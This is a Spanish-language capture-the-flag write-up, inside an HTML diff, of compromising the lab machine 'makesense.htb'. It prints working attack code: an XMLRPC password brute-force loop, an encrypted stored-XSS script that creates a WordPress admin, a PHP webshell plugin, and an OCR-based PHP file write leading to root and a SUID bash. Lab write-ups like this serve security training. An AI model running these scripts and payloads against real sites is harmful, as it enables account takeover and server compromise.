+                    <p>El tema de WordPress incluía una herramienta única de grabación de voz. Analizando su JavaScript, encontré una <code>ENCRYPTION_KEY</code> simétrica hardcodeada y dos acciones AJAX: <code>save_voice_raw</code> y <code>save_voice_results</code>. Cifrando un payload malicioso con esa clave y guardándolo como "transcription" y "summary" de una grabación, conseguí un XSS almacenado que se disparaba cuando un administrador visitaba la página de grabaciones. Usé un payload JavaScript estilo CSRF para crear una nueva cuenta de administrador de WordPress mediante <code>/wp-admin/user-new.php</code>.</p>
+
+                    <p>Con acceso de administrador, subí un plugin malicioso con una webshell PHP, obtuve ejecución de código y lancé una reverse shell. Dentro de <code>wp-config.php</code> encontré credenciales reutilizadas del usuario <code>walter</code>, que me dieron la flag de usuario.</p>
+
+                    <p>Para la escalada de privilegios, root ejecutaba una aplicación web PHP de OCR en <code>127.0.0.1:8001</code> que usaba <code>tesseract</code> para reconocer texto de imágenes subidas y podía guardar la salida del OCR en un nombre de archivo arbitrario. Dado que la app era PHP y permitía extensiones arbitrarias, creé una imagen con código PHP (<code>&lt;?php ... ?&gt;</code>), hice que el motor OCR la "reconociese" y guardé la salida como un archivo <code>.php</code> en el web root — logrando RCE como root. El payload final puso el bit SUID a <code>/bin/bash</code>.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Fuerza bruta contra XMLRPC de WordPress, XSS almacenado mediante payload cifrado, creación de usuario admin estilo CSRF, webshell mediante plugin malicioso, reutilización de credenciales, RCE por escritura de archivo PHP vía OCR/tesseract (CVE-2026-26832).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar puertos abiertos y servicios:</p>
+                <pre data-lang="plaintext"><code>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
+|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
+443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+| ssl-cert: Subject: commonName=makesense.htb
+| Not valid before: 2026-05-29T16:37:29
+|_Not valid after:  2126-05-05T16:37:29
+| tls-alpn:
+|_  http/1.1
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-title: Agency LLC
+|_http-generator: WordPress 7.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Añado <code>makesense.htb</code> al fichero <code>/etc/hosts</code>. La página del puerto 443 parece sencilla, y claramente se trata de un WordPress:</p>
+                <pre data-lang="plaintext"><code>$ whatweb https://makesense.htb
+https://makesense.htb [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], Email[info@webagency.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.39.201], JQuery[3.7.1], MetaGenerator[WordPress 7.0], Script[application/json,module], Title[Agency LLC], UncommonHeaders[link], WordPress[7.0]</code></pre>
+
+                <h2>Enumeración de WordPress</h2>
+                <p>Ejecutando <code>wpscan</code> encuentro un par de cosas interesantes:</p>
+                <pre data-lang="plaintext"><code>[+] XML-RPC seems to be enabled: https://makesense.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: https://makesense.htb/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%</code></pre>
+
+                <p>En la carpeta de uploads hay un audio de un tal <code>jake</code> y parece que dice una contraseña, algo así como <code>Clearlightnicesmooth4123</code>. Pero no consigo que funcione en <a href="https://makesense.htb/wp-login.php">https://makesense.htb/wp-login.php</a>, aún así confirmo que existe el usuario <code>jake</code>, por lo que entiendo que este es el administrador.</p>
+
+                <p>El sonido del audio es muy robótico, lo transcribo y una web me dice esto:</p>
+                <p><img src="./media/image1.png" alt="Transcripción web del audio robótico que revela una pista de contraseña" /></p>
+
+                <h2>Fuerza Bruta contra XMLRPC</h2>
+                <p>Con un poco de fuerza bruta usando variaciones de la contraseña transcrita a través del XMLRPC acaban saliendo credenciales válidas:</p>
+                <pre data-lang="bash"><code>$ <span class="kw">for</span> pwd <span class="kw">in</span> \
+  clearlightnicesmooth4123 clearlightnicesmooth4923 \
+  ClearlightNicesmooth4123 ClearlightNicesmooth4923 \
+  clearlight_nice_smooth_4123 clearlight_nice_smooth_4923 \
+  ClearLightNiceSmooth4123 ClearLightNiceSmooth4923 \
+  clear_light_nice_smooth_4123 clear_light_nice_smooth_4923 \
+  nicesmooth_clearlight_4123 nicesmooth_clearlight_4923 \
+  NiceSmoothClearLight4123 NiceSmoothClearLight4923 \
+  clearlightnicesmooth_4123 clearlightnicesmooth_4923 \
+  clearLightNiceSmooth4123 clearLightNiceSmooth4923 \
+  <span class="str">"clearlight nice smooth 4123"</span> <span class="str">"clearlight nice smooth 4923"</span>; <span class="kw">do</span>
+  result=<span class="op">$(</span><span class="cmd">curl</span> <span class="flag">-sk</span> <span class="flag">-X</span> POST https://makesense.htb/xmlrpc.php \
+    <span class="flag">-H</span> <span class="str">"Content-Type: text/xml"</span> \
+    <span class="flag">-d</span> <span class="str">"&lt;?xml version=\"1.0\"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+&lt;params&gt;
+&lt;param&gt;&lt;value&gt;&lt;string&gt;jake&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+&lt;param&gt;&lt;value&gt;&lt;string&gt;$pwd&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+&lt;/params&gt;&lt;/methodCall&gt;"</span><span class="op">)</span>
+  <span class="kw">if</span> <span class="cmd">echo</span> <span class="str">"$result"</span> | <span class="cmd">grep</span> <span class="flag">-q</span> <span class="str">"isAdmin\|blogName"</span>; <span class="kw">then</span>
+    <span class="cmd">echo</span> <span class="str">"[+] VALID: jake:$pwd"</span>
+  <span class="kw">else</span>
+    <span class="cmd">echo</span> <span class="str">"[-] Failed: $pwd"</span>
+  <span class="kw">fi</span>
+<span class="kw">done</span></code></pre>
+
+                <pre data-lang="plaintext"><code>[+] VALID: jake:ClearLightNiceSmooth4923</code></pre>
+
+                <p>Así que las credenciales son <code>jake:ClearLightNiceSmooth4923</code>. Aunque este usuario no es administrador del WordPress, así que no tengo este nivel de acceso aún.</p>
+
+                <p>Enumerando usuarios con <code>wpscan</code>:</p>
+                <pre data-lang="bash"><code>$ <span class="cmd">wpscan</span> <span class="flag">--url</span> https://makesense.htb \
+  <span class="flag">--disable-tls-checks</span> \
+  <span class="flag">--enumerate</span> u1-10</code></pre>
+                <pre data-lang="plaintext"><code>[i] User(s) Identified:
+[+] jake
+[+] admin
+[+] walter</code></pre>
+
+                <p>Pero el reuso de credenciales no funciona con ninguno de ellos.</p>
+
+                <h2>La Herramienta de Voz - A la Caza del XSS</h2>
+                <p>Cambiando un poco el enfoque, me centro en la herramienta de voz que presenta el WordPress, que es algo único. En el source de la página encuentro que carga estos JS:</p>
+                <pre data-lang="html"><code>&lt;<span class="kw">script</span> <span class="param">id</span>=<span class="str">"whisper-wrapper-js"</span> <span class="param">src</span>=<span class="str">"https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js?ver=1.0"</span>&gt;&lt;/<span class="kw">script</span>&gt;
+&lt;<span class="kw">script</span> <span class="param">id</span>=<span class="str">"whisper-wrapper-js"</span> <span class="param">src</span>=<span class="str">"https://makesense.htb/wp-content/themes/webagency/assets/js/main.js"</span>&gt;&lt;/<span class="kw">script</span>&gt;</code></pre>
+
+                <p>Nada más ver el archivo veo una clave de encriptación en una constante, lo que llama la atención inmediatamente y puede ser un indicador de que puede haber otros errores:</p>
+                <pre data-lang="javascript"><code><span class="cm">// Symmetric encryption key (must match server-side)</span>
+<span class="kw">const</span> ENCRYPTION_KEY = <span class="str">'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'</span>;</code></pre>
+
+                <p>En el archivo <code>main.js</code> se llama al endpoint de ajax con las acciones y los bodies:</p>
+                <pre data-lang="javascript"><code><span class="cm">// save_voice_raw</span>
+formData.<span class="func">append</span>(<span class="str">'action'</span>, <span class="str">'save_voice_raw'</span>);
+formData.<span class="func">append</span>(<span class="str">'nonce'</span>, webagency_ajax.nonce);
+formData.<span class="func">append</span>(<span class="str">'voice_recording'</span>, wavBlob, <span class="str">'voice-message.wav'</span>);
+
+<span class="cm">// save_voice_results</span>
+formData.<span class="func">append</span>(<span class="str">'action'</span>, <span class="str">'save_voice_results'</span>);
+formData.<span class="func">append</span>(<span class="str">'nonce'</span>, webagency_ajax.nonce);
+formData.<span class="func">append</span>(<span class="str">'post_id'</span>, postId);
+formData.<span class="func">append</span>(<span class="str">'encrypted_payload'</span>, encryptedPayload);</code></pre>
+
+                <p>El primer POST guarda el <code>.wav</code> de la grabación y devuelve una ID. El segundo guarda los resultados encriptados con la clave que estaba en el código y lo asigna a la ID que se ha generado en la llamada POST anterior. Con esto lo que se me ocurre es que quizá se pueda ejecutar un payload XSS y el administrador que hemos visto antes lo ejecute en su cliente.</p>
+
+                <p>Las cookies de sesión son HttpOnly, pero quizá se pueda crear un usuario administrador de WordPress con un payload estilo CSRF.</p>
+
+                <h2>Probando el XSS</h2>
+                <p>Para comprobar si XSS podría funcionar, primero genero un payload XSS simple de prueba encriptado con la clave que he encontrado:</p>
+                <pre data-lang="python"><code><span class="kw">import</span> json, base64, os
+<span class="kw">from</span> cryptography.hazmat.primitives.ciphers.aead <span class="kw">import</span> AESGCM
+<span class="kw">from</span> cryptography.hazmat.primitives <span class="kw">import</span> hashes
+<span class="kw">from</span> cryptography.hazmat.backends <span class="kw">import</span> default_backend
+
+<span class="var">ENCRYPTION_KEY</span> = <span class="str">'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'</span>
+
+<span class="cm"># Derive key using SHA-256</span>
+digest = hashes.<span class="func">Hash</span>(hashes.<span class="func">SHA256</span>(), backend=<span class="func">default_backend</span>())
+digest.<span class="func">update</span>(<span class="var">ENCRYPTION_KEY</span>.<span class="func">encode</span>())
+key_bytes = digest.<span class="func">finalize</span>()
+
+<span class="cm"># Simple XSS payload</span>
+payload = {
+    <span class="str">"transcription"</span>: <span class="str">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>,
+    <span class="str">"summary"</span>: <span class="str">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>
+}
+
+data = json.<span class="func">dumps</span>(payload).<span class="func">encode</span>()
+iv = os.<span class="func">urandom</span>(<span class="num">12</span>)
+aesgcm = <span class="func">AESGCM</span>(key_bytes)
+encrypted = aesgcm.<span class="func">encrypt</span>(iv, data, <span class="kw">None</span>)
+combined = iv + encrypted
+<span class="func">print</span>(base64.<span class="func">b64encode</span>(combined).<span class="func">decode</span>())</code></pre>
+
+                <p>Luego voy a crear un <code>.wav</code> dummy con Python y voy a enviar la petición para guardar el "recording":</p>
+                <pre data-lang="bash"><code>$ <span class="cmd">python3</span> <span class="flag">-c</span> <span class="str">"
+import wave, struct
+with wave.open('/tmp/dummy.wav', 'w') as f:
+    f.setnchannels(1)
+    f.setsampwidth(2)
+    f.setframerate(16000)
+    f.writeframes(struct.pack('&lt;h', 0) * 16000)
+"</span>
+
+$ <span class="cmd">curl</span> <span class="flag">-sk</span> <span class="flag">-X</span> POST https://makesense.htb/wp-admin/admin-ajax.php \
+  <span class="flag">-b</span> <span class="str">"wordpress_logged_in_666f3cbf9610031df176da93aa83bc38=jake|1783788348|CoQ7uPIIxfjzy4WFHNsDuNrBJMwav28Y9vKYEynGyNr|660717170898f7c324bbeec48d484ae44e1ba1ace6e2e58fe6bf769e860c9919"</span> \
+  <span class="flag">-F</span> <span class="str">"action=save_voice_raw"</span> \
+  <span class="flag">-F</span> <span class="str">"nonce=6f1ad8954c"</span> \
+  <span class="flag">-F</span> <span class="str">"voice_recording=@/tmp/dummy.wav;type=audio/wav"</span></code></pre>
+                <pre data-lang="json"><code>{<span class="str">"success"</span>:<span class="kw">true</span>,<span class="str">"data"</span>:{<span class="str">"message"</span>:<span class="str">"Audio saved, processing started."</span>,<span class="str">"post_id"</span>:<span class="num">74</span>}}</code></pre>
+
+                <p>Por último envío el payload encriptado que he generado:</p>
+                <pre data-lang="bash"><code>$ <span class="cmd">curl</span> <span class="flag">-sk</span> <span class="flag">-X</span> POST https://makesense.htb/wp-admin/admin-ajax.php \
+  <span class="flag">-b</span> <span class="str">"wordpress_logged_in_666f3cbf...c9919"</span> \
+  <span class="flag">-F</span> <span class="str">"action=save_voice_results"</span> \
+  <span class="flag">-F</span> <span class="str">"nonce=6f1ad8954c"</span> \
+  <span class="flag">-F</span> <span class="str">"post_id=74"</span> \
+  <span class="flag">-F</span> <span class="str">"encrypted_payload=a4TeBCkjwVbXkpCAYwKxFR91dVWs3Be1XwG9RJSW1+qtVZtfapjte/UPWZwl/qhUJMxF6q8+laLyy3aphRpXBtQzdAOlIL02eHv3kfJjDRSwhHzVCXaoARf2yfmP1jawgzUkV7f8oK/w9bdZAy3M4SFr"</span></code></pre>
+                <pre data-lang="json"><code>{<span class="str">"success"</span>:<span class="kw">true</span>,<span class="str">"data"</span>:{<span class="str">"message"</span>:<span class="str">"Results saved successfully!"</span>,<span class="str">"post_id"</span>:<span class="num">74</span>}}</code></pre>
+
+                <p>Al visitar con <code>jake</code> la página de los recordings veo que mi payload se ejecuta:</p>
+                <p><img src="./media/image6.png" alt="Alerta XSS disparándose en la página de grabaciones confirmando el XSS almacenado" /></p>
+
+                <h2>Del XSS a la Creación del Usuario Admin</h2>
+                <p>La idea ahora es generar un payload que apunte a mi servidor para ver si hay alguien visitando la página. Sigo el mismo proceso pero cambio el payload a un callback a mi servidor, pero al no ser HTTPS lo bloquea. Un request HTTPS tampoco funcionará porque no confiará en un certificado autofirmado y las máquinas de HTB no tienen acceso a internet.</p>
+
+                <p>Así que me voy a centrar directamente en el payload estilo CSRF para intentar que, si el admin visita la web, se cree un usuario. Genero este script que hace todo el proceso de una tirada:</p>
+                <pre data-lang="python"><code><span class="kw">import</span> json, base64, os, wave, struct, requests
+<span class="kw">from</span> cryptography.hazmat.primitives.ciphers.aead <span class="kw">import</span> AESGCM
+<span class="kw">from</span> cryptography.hazmat.primitives <span class="kw">import</span> hashes
+<span class="kw">from</span> cryptography.hazmat.backends <span class="kw">import</span> default_backend
+
+<span class="cm"># Config</span>
+<span class="var">TARGET</span> = <span class="str">"https://makesense.htb/wp-admin/admin-ajax.php"</span>
+<span class="var">COOKIE</span> = <span class="str">"wordpress_logged_in_666f3cbf9610031df176da93aa83bc38=jake|1783788348|CoQ7uPIIxfjzy4WFHNsDuNrBJMwav28Y9vKYEynGyNr|660717170898f7c324bbeec48d484ae44e1ba1ace6e2e58fe6bf769e860c9919"</span>
+<span class="var">NONCE</span> = <span class="str">"6f1ad8954c"</span>
+<span class="var">ENCRYPTION_KEY</span> = <span class="str">'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'</span>
+
+<span class="var">XSS</span> = <span class="str">"""&lt;script&gt;fetch('/wp-admin/user-new.php').then(r=&gt;r.text()).then(html=&gt;{const n=html.match(/_wpnonce_create-user" value="([^"]+)"/)[1];fetch('/wp-admin/user-new.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=createuser&amp;_wpnonce_create-user='+n+'&amp;user_login=asd&amp;email=asd@asd.com&amp;pass1=Asd123!&amp;pass2=Asd123!&amp;role=administrator&amp;noconfirmation=1'})})&lt;/script&gt;"""</span>
+
+<span class="cm"># Step 0 - create dummy wav</span>
+wav_path = <span class="str">'/tmp/dummy.wav'</span>
+<span class="kw">with</span> wave.<span class="func">open</span>(wav_path, <span class="str">'w'</span>) <span class="kw">as</span> f:
+    f.<span class="func">setnchannels</span>(<span class="num">1</span>)
+    f.<span class="func">setsampwidth</span>(<span class="num">2</span>)
+    f.<span class="func">setframerate</span>(<span class="num">16000</span>)
+    f.<span class="func">writeframes</span>(struct.<span class="func">pack</span>(<span class="str">'&lt;h'</span>, <span class="num">0</span>) * <span class="num">16000</span>)
+<span class="func">print</span>(<span class="str">"[*] Dummy wav created"</span>)
+
+<span class="cm"># Step 1 - encrypt payload</span>
+digest = hashes.<span class="func">Hash</span>(hashes.<span class="func">SHA256</span>(), backend=<span class="func">default_backend</span>())
+digest.<span class="func">update</span>(<span class="var">ENCRYPTION_KEY</span>.<span class="func">encode</span>())
+key_bytes = digest.<span class="func">finalize</span>()
+
+payload = {<span class="str">"transcription"</span>: <span class="var">XSS</span>, <span class="str">"summary"</span>: <span class="var">XSS</span>}
+data = json.<span class="func">dumps</span>(payload).<span class="func">encode</span>()
+iv = os.<span class="func">urandom</span>(<span class="num">12</span>)
+aesgcm = <span class="func">AESGCM</span>(key_bytes)
+encrypted = aesgcm.<span class="func">encrypt</span>(iv, data, <span class="kw">None</span>)
+encrypted_payload = base64.<span class="func">b64encode</span>(iv + encrypted).<span class="func">decode</span>()
+<span class="func">print</span>(<span class="str">"[*] Payload encrypted"</span>)
+
+<span class="cm"># Step 2 - upload wav, get post_id</span>
+session = requests.<span class="func">Session</span>()
+session.verify = <span class="kw">False</span>
+session.cookies.<span class="func">set</span>(
+    <span class="var">COOKIE</span>.<span class="func">split</span>(<span class="str">'='</span>)[<span class="num">0</span>],
+    <span class="str">'='</span>.<span class="func">join</span>(<span class="var">COOKIE</span>.<span class="func">split</span>(<span class="str">'='</span>)[<span class="num">1</span>:])
+)
+
+r1 = session.<span class="func">post</span>(<span class="var">TARGET</span>, data={
+    <span class="str">"action"</span>: <span class="str">"save_voice_raw"</span>,
+    <span class="str">"nonce"</span>: <span class="var">NONCE</span>
+}, files={
+    <span class="str">"voice_recording"</span>: (<span class="str">"voice-message.wav"</span>, <span class="func">open</span>(wav_path, <span class="str">'rb'</span>), <span class="str">"audio/wav"</span>)
+})
+post_id = r1.<span class="func">json</span>()[<span class="str">'data'</span>][<span class="str">'post_id'</span>]
+<span class="func">print</span>(<span class="str">f"[*] Post created: {post_id}"</span>)
+
+<span class="cm"># Step 3 - send forged encrypted payload</span>
+r2 = session.<span class="func">post</span>(<span class="var">TARGET</span>, data={
+    <span class="str">"action"</span>: <span class="str">"save_voice_results"</span>,
+    <span class="str">"nonce"</span>: <span class="var">NONCE</span>,
+    <span class="str">"post_id"</span>: post_id,
+    <span class="str">"encrypted_payload"</span>: encrypted_payload
+})
+<span class="func">print</span>(<span class="str">f"[*] Results: {r2.<span class="func">json</span>()}"</span>)
+<span class="func">print</span>(<span class="str">f"\n[+] Done! Check submission #{post_id} in WP admin"</span>)</code></pre>
+
+                <p>Incluido en este script está el payload XSS que primero recogerá el nonce necesario en un request y luego en otro request hará que se cree el nuevo usuario administrador apuntando a la ruta <code>/wp-admin/user-new.php</code> y enviando este body:</p>
+                <pre data-lang="plaintext"><code>user_login=asd&email=asd@asd.com&pass1=Asd123!&pass2=Asd123!&role=administrator&noconfirmation=1</code></pre>
+
+                <p>Al cabo del rato compruebo que el usuario se ha creado y puedo acceder al panel de administrador.</p>
+
+                <h2>De Admin a Webshell - Plugin Malicioso</h2>
+                <p>A partir de aquí, la meta es conseguir una webshell mediante un plugin malicioso. Esto es bastante sencillo en WordPress, simplemente creo y zipeo un archivo PHP así:</p>
+                <pre data-lang="php"><code>&lt;?php
+<span class="cm">/**
+ * Plugin Name: xd
+ * Plugin URI: https://potato.com
+ * Description: Wordpress webshell
+ * Version: 1.0
+ * Author: xd
+ * Author URI: https://xd.com
+ * License: https://nosuchlicense
+ */</span>
+<span class="kw">if</span>(<span class="func">isset</span>(<span class="var">$_GET</span>[<span class="str">'cmd'</span>]))
+{
+    <span class="func">system</span>(<span class="var">$_GET</span>[<span class="str">'cmd'</span>]);
+}
+?&gt;</code></pre>
+                <pre data-lang="bash"><code>$ <span class="cmd">zip</span> xd.zip xd.php</code></pre>
+
+                <p>Y lo subo a WordPress a través del menú. Luego, en la ruta <a href="https://makesense.htb/wp-content/plugins/xd/xd.php?cmd=">https://makesense.htb/wp-content/plugins/xd/xd.php?cmd=</a>, encuentro la webshell:</p>
+                <p><img src="./media/image4.png" alt="Salida de la webshell PHP confirmando la ejecución de comandos mediante el plugin malicioso" /></p>
+
+                <p>Teniendo la webshell simplemente me envío una reverse shell.</p>
+
+                <h2>Movimiento Lateral - Usuario walter</h2>
+                <p>En la máquina víctima veo los usuarios <code>walter</code> y <code>admin</code> en <code>/home</code>. También veo un puerto abierto localmente:</p>
+                <pre data-lang="plaintext"><code>tcp LISTEN 0 4096 127.0.0.1:8001</code></pre>
+
+                <p>En <code>/opt</code> existe la ruta <code>/google/chrome</code>, lo que quizá indica el uso de puppeteer o herramientas parecidas, aunque es posible que solo sea para triggerear el XSS de antes.</p>
+
+                <p>En el archivo <code>wp-config.php</code> encuentro las credenciales de <code>walter</code> reusadas para la DB de SQLite:</p>
+                <pre data-lang="php"><code><span class="func">define</span>( <span class="str">'DB_NAME'</span>, <span class="str">'wordpress'</span> );
+<span class="func">define</span>( <span class="str">'DB_USER'</span>, <span class="str">'walter'</span> );
+<span class="func">define</span>( <span class="str">'DB_PASSWORD'</span>, <span class="str">'JbhHDAEgXvri3!'</span> );</code></pre>
+
+                <p>Las credenciales me sirven para <code>walter</code> y consigo la flag de usuario. Establezco persistencia añadiendo mi clave pública SSH en el <code>authorized_keys</code> de <code>walter</code>.</p>
+
+                <h2>Escalada de Privilegios - Escritura de Archivo PHP vía OCR</h2>
+                <p>Parece que root ejecuta un servicio PHP en el puerto 8001 mediante cron a partir de un script bash que no puedo ver porque está en <code>/root</code>:</p>
+                <pre data-lang="plaintext"><code>root 1337  \_ /usr/sbin/CRON -f -P
+root 1352  \_ /bin/sh -c /root/.scripts/start_ocr4.sh
+root 1354  \_ /bin/bash /root/.scripts/start_ocr4.sh
+root 1377  \_ php -S 127.0.0.1:8001 -t /root/ocr4/
+root 32479 \_ sleep 1</code></pre>
+
+                <p>Me hago port forwarding del puerto 8001 y veo que hay que entrar con usuario y contraseña, pero las credenciales de <code>walter</code> funcionan.</p>
+
+                <p>También veo con <code>pspy64</code> que <code>admin</code> ejecuta esto:</p>
+                <pre data-lang="plaintext"><code>CMD: UID=1001 PID=34411 | /usr/bin/python3 /home/admin/.process/prey-unified.py</code></pre>
+
+                <p>También veo alguna cosa de Chrome, quizá <code>admin</code> es quien usa Chrome para el XSS de antes.</p>
+
+                <p>En el puerto 8001 veo esta pequeña aplicación:</p>
+                <p><img src="./media/image3.png" alt="Aplicación web OCR ejecutándose en el puerto 8001 con funcionalidad de reconocimiento de imágenes" /></p>
+
+                <p>Al darle a recognize veo que localmente root ejecuta estos comandos:</p>
+                <pre data-lang="plaintext"><code>CMD: UID=0 PID=34346 | sh -c -- tesseract '/root/ocr4/tmp/draw_6a4fec874082d.png' '/root/ocr4/tmp/out_6a4fec874082f' 2>&1
+CMD: UID=0 PID=34347 | tesseract /root/ocr4/tmp/draw_6a4fec874082d.png /root/ocr4/tmp/out_6a4fec874082f</code></pre>
+
+                <p>Y en la web veo que me permite guardarlo en un archivo:</p>
+                <p><img src="./media/image5.png" alt="Opción de la aplicación web OCR para guardar la salida reconocida en un archivo con nombre personalizado" /></p>
+
+                <p>Al guardar el archivo, veo que se envía un request POST a <a href="http://localhost:8001/">http://localhost:8001/</a> con el body:</p>
+                <pre data-lang="plaintext"><code>ocr_id=ocr_6a4fedd1d68a65.33429482&filename=xd.asd&save_output=</code></pre>
+
+                <p>Hacer un replay del request no parece funcionar ya que el <code>ocr_id</code> parece de un solo uso y no veo cómo generar uno que no se haya usado.</p>
+
+                <p>En relación a <code>tesseract</code> y OCR veo un CVE reciente que justamente afecta a la función recognize, que es lo que se está haciendo aquí: <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26832">https://nvd.nist.gov/vuln/detail/CVE-2026-26832</a>.</p>
+
+                <p>Veo que se puede visitar en la web la ruta donde se guarda el archivo:</p>
+                <p><img src="./media/image7.png" alt="Navegador mostrando el archivo de salida OCR guardado y accesible a través del web root" /></p>
+
+                <h2>Creación del Payload de Imagen PHP</h2>
+                <p>Viendo que la web es PHP, se me ocurre escribir un texto PHP y guardar un archivo <code>.php</code>, ya que he visto que me permite poner extensiones como quiera. Pero quizá es algo pesado hacerlo manualmente en el buscador, así que voy a usar un script simple con IA para que haga exactamente eso — dibujar código PHP en una imagen:</p>
+                <pre data-lang="python"><code><span class="kw">from</span> PIL <span class="kw">import</span> Image, ImageDraw, ImageFont
+<span class="kw">import</span> base64
+<span class="kw">import</span> urllib.parse
+
+payload = <span class="str">"&lt;?php system('id'); ?&gt;"</span>
+
+img = Image.<span class="func">new</span>(<span class="str">'RGB'</span>, (<span class="num">1000</span>, <span class="num">300</span>), color=<span class="str">'white'</span>)
+d = ImageDraw.<span class="func">Draw</span>(img)
+
+<span class="kw">try</span>:
+    font = ImageFont.<span class="func">truetype</span>(<span class="str">"/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf"</span>, <span class="num">40</span>)
+<span class="kw">except</span>:
+    <span class="kw">try</span>:
+        font = ImageFont.<span class="func">truetype</span>(<span class="str">"/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"</span>, <span class="num">40</span>)
+    <span class="kw">except</span>:
+        font = ImageFont.<span class="func">load_default</span>()
+
+d.<span class="func">text</span>((<span class="num">50</span>, <span class="num">100</span>), payload, fill=<span class="str">'black'</span>, font=font)
+img.<span class="func">save</span>(<span class="str">'/tmp/payload_clean.png'</span>)
+
+<span class="kw">with</span> <span class="func">open</span>(<span class="str">'/tmp/payload_clean.png'</span>, <span class="str">'rb'</span>) <span class="kw">as</span> f:
+    b64 = base64.<span class="func">b64encode</span>(f.<span class="func">read</span>()).<span class="func">decode</span>()
+
+data_url = <span class="str">f"data:image/png;base64,{b64}"</span>
+encoded = urllib.parse.<span class="func">quote</span>(data_url)
+<span class="func">print</span>(encoded)</code></pre>
+
+                <p>Lo que haré es recoger con Burp Suite los 2 requests que se envían, uno para enviar la imagen y otro para crear el archivo, y hacer un replay del primer request con la imagen que me genere este script. Luego el OCR ID se puede encontrar en un input en el HTML y podré recuperarlo para hacer la segunda petición.</p>
+
+                <p>Lo hago con el comando <code>id</code> y veo que funciona:</p>
+                <p><img src="./media/image2.png" alt="Archivo PHP creado vía OCR ejecutando el comando id como root" /></p>
+
+                <p>Para hacerlo más simple, directamente ejecutaré <code>chmod u+s /bin/bash</code> desde PHP para evitar tener que enviarme una webshell, y de esta manera consigo la flag del sistema ejecutando la bash SUID. Máquina completada.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
